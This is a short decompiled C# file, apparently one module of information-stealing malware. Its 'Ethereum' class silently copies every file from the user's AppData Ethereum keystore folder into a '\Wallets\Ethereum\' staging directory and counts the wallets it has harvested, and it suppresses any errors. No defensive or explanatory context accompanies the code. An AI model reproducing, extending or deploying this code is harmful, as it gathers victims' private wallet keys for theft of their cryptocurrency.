﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000033 RID: 51
	internal class Ethereum
	{
		// Token: 0x060000FE RID: 254 RVA: 0x000060F8 File Offset: 0x000042F8
		public static void EcoinStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Ethereum\\keystore").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Ethereum.EthereumDir);
					fileInfo.CopyTo(directorypath + Ethereum.EthereumDir + fileInfo.Name);
				}
				Ethereum.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x0400007E RID: 126
		public static int count = 0;

		// Token: 0x0400007F RID: 127
		public static string EthereumDir = "\\Wallets\\Ethereum\\";
	}
}
